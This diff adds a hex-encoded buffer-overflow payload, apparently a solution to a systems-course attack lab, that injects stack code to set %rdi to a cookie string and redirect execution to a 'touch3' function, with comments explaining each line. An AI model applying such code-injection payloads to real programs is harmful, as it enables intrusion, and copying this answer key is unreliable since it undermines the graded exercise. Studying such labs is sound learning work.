@@ -1,0 +1,10 @@
+48 c7 c7 70 e9 63 55 c3 /* mov 0x5563e970 [rsp address (0x5563e928) + buffer offset (0x38) + 8 bytes for rsp return address + 8 bytes for touch] to %rdi , which will be the address of the last line of this code (where the cookie is stored to string), and retq */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+28 e9 63 55 00 00 00 00 /* original rsp address (first line of this code) */
+96 18 40 00 00 00 00 00 /* touch3 address reverse (0x0000000000401896) */
+33 30 63 64 31 65 65 34 /* cookie (0x30cd1ee4) text to hex numbers: http://www.unit-conversion.info/texttools/hexadecimal/ */
